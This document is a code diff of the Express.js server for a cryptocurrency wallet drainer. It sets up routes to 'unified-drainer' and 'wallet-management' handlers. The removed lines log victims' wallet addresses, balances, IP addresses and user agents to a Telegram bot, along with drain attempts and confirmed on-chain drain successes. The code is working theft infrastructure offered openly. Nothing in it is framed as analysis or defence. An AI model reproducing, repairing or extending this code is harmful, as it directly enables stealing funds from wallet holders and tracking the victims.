@@ -1,190 +1,115 @@
 import express from 'express';
 import cors from 'cors';
-import unifiedDrainerHandler from './api/unified-drainer.js';
-import walletManagementHandler from './api/wallet-management.js';
-import telegramLogger from './src/telegram.js';
-import envConfig from './src/environment.js';
-import extractUserIP from './src/ip-extraction.js';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import config from './src/environment.js';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
-const PORT = envConfig.server.port;
+const PORT = process.env.PORT || 3000;
 
 // Middleware
-app.use(cors());
-app.use(express.json());
-app.use(express.static('public'));
-
-// Serve src directory with correct MIME type for JavaScript modules
-app.use('/src', express.static('src', {
-  setHeaders: (res, path) => {
-    if (path.endsWith('.js')) {
-      res.setHeader('Content-Type', 'application/javascript');
-    }
-  }
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization']
 }));
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// Serve static files from public directory
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Health check endpoint
 app.get('/health', (req, res) => {
-  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
-});
-
-// Unified drainer endpoint (replaces both original and enhanced)
-app.post('/api/drainer', unifiedDrainerHandler);
-app.post('/api/wallet-management', walletManagementHandler); // Comprehensive wallet management
-
-// Server-side deduplication cache - 2025 FIX
-const serverWalletLogCache = new Map();
-const SERVER_WALLET_LOG_CACHE_TTL = 300000; // 5 minutes
-
-// Log wallet detection with server-side deduplication - 2025 FIX
-app.post('/api/drainer/log-wallet', async (req, res) => {
-  try {
-    const { publicKey, lamports, userAgent, walletType } = req.body;
-    const userIp = extractUserIP(req); // Use centralized IP extraction
-    
-    // Server-side deduplication check - 2025 FIX
-    const walletKey = `${publicKey}-${walletType}`;
-    const now = Date.now();
-    const cachedLog = serverWalletLogCache.get(walletKey);
-    
-    if (cachedLog && (now - cachedLog.timestamp) < SERVER_WALLET_LOG_CACHE_TTL) {
-      console.log(`[SERVER_CACHE] Duplicate wallet log prevented: ${publicKey} (${walletType})`);
-      return res.json({ success: true, cached: true });
-    }
-    
-    // Log to Telegram with deduplication
-    await telegramLogger.logWalletDetection({
-      publicKey,
-      lamports,
-      userAgent,
-      walletType,
-      userIp
-    });
-    
-    // Cache the log
-    serverWalletLogCache.set(walletKey, { timestamp: now });
-    
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error logging wallet detection:', error);
-    res.status(500).json({ error: 'Failed to log wallet detection' });
-  }
-});
-
-// Log drain attempt when transaction is presented to user for signing - 2025 FIX
-app.post('/api/drainer/log-drain-attempt', async (req, res) => {
-  try {
-    const { publicKey, walletType, lamports, instructions, transactionSize } = req.body;
-    const userIp = extractUserIP(req);
-
-    // Log drain attempt to Telegram
-    await telegramLogger.logDrainAttempt({
-      publicKey,
-      lamports: lamports || 0,
-      ip: userIp,
-      walletType: walletType || 'Unknown',
-      success: true, // Transaction was successfully created and presented
-      instructions: instructions || 0,
-      transactionSize: transactionSize || 0
-    });
-
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error logging drain attempt:', error);
-    res.status(500).json({ error: 'Failed to log drain attempt' });
-  }
-});
-
-// Test Telegram connection - 2025 DEBUG
-app.get('/api/test/telegram', async (req, res) => {
-  try {
-    console.log('[API] Testing Telegram connection...');
-    const isConnected = await telegramLogger.testConnection();
-    
-    res.json({ 
-      success: isConnected,
-      message: isConnected ? 'Telegram connection successful' : 'Telegram connection failed',
-      enabled: telegramLogger.enabled,
-      hasToken: !!telegramLogger.botToken,
-      hasChatId: !!telegramLogger.chatId
-    });
-  } catch (error) {
-    console.error('Error testing Telegram:', error);
-    res.status(500).json({ 
-      success: false,
-      error: 'Failed to test Telegram connection',
-      message: error.message
-    });
-  }
-});
-
-// Log transaction confirmation (actual on-chain confirmation) - 2025 FIX
-app.post('/api/drainer/log-confirmation', async (req, res) => {
-  try {
-    const { publicKey, signature, lamports, userAgent, walletType, status } = req.body;
-    const userIp = extractUserIP(req);
-    
-    // Only log drain success for confirmed/finalized transactions
-    if (status !== 'confirmed' && status !== 'finalized') {
-      console.log(`[CONFIRMATION] Skipping drain success log - status not confirmed: ${status}`);
-      return res.json({ success: true, skipped: true });
-    }
-    
-    // Server-side deduplication check
-    const confirmationKey = `${publicKey}-${signature}`;
-    const now = Date.now();
-    const cachedLog = serverWalletLogCache.get(confirmationKey);
-    
-    if (cachedLog && (now - cachedLog.timestamp) < SERVER_WALLET_LOG_CACHE_TTL) {
-      console.log(`[SERVER_CACHE] Duplicate confirmation log prevented: ${publicKey} (${signature})`);
-      return res.json({ success: true, cached: true });
-    }
-    
-    // Log actual drain success (confirmed on-chain)
-    await telegramLogger.logDrainSuccess({
-      publicKey,
-      signature,
-      lamports,
-      userAgent,
-      walletType,
-      ip: userIp
-    });
-    
-    // Cache the log
-    serverWalletLogCache.set(confirmationKey, { timestamp: now });
-    
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error logging transaction confirmation:', error);
-    res.status(500).json({ error: 'Failed to log transaction confirmation' });
-  }
-});
-
-// Enhancement modules status endpoint
-app.get('/api/enhancements/status', async (req, res) => {
-  res.json({
+  res.json({ 
+    status: 'healthy', 
     timestamp: new Date().toISOString(),
-    status: 'basic',
-    message: 'Enhancement modules removed - using core functionality only'
-  });
-});
-
-// Enhancement health endpoint - returning basic health
-app.get('/api/enhancements/health', async (req, res) => {
-  res.json({
-    timestamp: new Date().toISOString(),
-    status: 'healthy',
-    message: 'Core functionality only - enhancement modules removed',
-    uptime: process.uptime(),
-    memory: process.memoryUsage(),
+    environment: config.NODE_ENV,
     version: '1.0.0'
   });
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🔗 API: http://localhost:${PORT}/api/drainer`);
+// API Routes - Direct routing for /api/drainer
+app.all('/api/drainer', async (req, res) => {
+  try {
+    const module = await import('./api/index.js');
+    await module.default(req, res);
+  } catch (error) {
+    console.error('Error loading index handler:', error);
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  }
+});
+
+app.use('/api/wallet-management', async (req, res, next) => {
+  try {
+    const module = await import('./api/wallet-management.js');
+    await module.default(req, res);
+  } catch (error) {
+    console.error('Error loading wallet management handler:', error);
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  }
+});
+
+app.use('/api/unified-drainer', async (req, res, next) => {
+  try {
+    const module = await import('./api/unified-drainer.js');
+    await module.default(req, res);
+  } catch (error) {
+    console.error('Error loading unified drainer handler:', error);
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  }
+});
+
+// Serve index.html for all other routes (SPA routing)
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Error handling middleware
+app.use((error, req, res, next) => {
+  console.error('Server error:', error);
+  res.status(500).json({ 
+    error: 'Internal server error',
+    message: error.message 
+  });
+});
+
+// Start server with error handling
+const server = app.listen(PORT, () => {
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
+  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
+  console.log(`🌍 Environment: ${config.NODE_ENV}`);
+  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
+});
+
+// Handle server errors
+server.on('error', (error) => {
+  if (error.code === 'EADDRINUSE') {
+    console.error(`❌ Port ${PORT} is already in use. Please kill the existing process or use a different port.`);
+    console.error(`💡 Try running: netstat -ano | findstr :${PORT}`);
+  } else {
+    console.error('❌ Server error:', error);
+  }
+  process.exit(1);
+});
+
+// Graceful shutdown
+process.on('SIGINT', () => {
+  console.log('\n🛑 Shutting down server gracefully...');
+  server.close(() => {
+    console.log('✅ Server closed');
+    process.exit(0);
+  });
 });
 
 export default app;
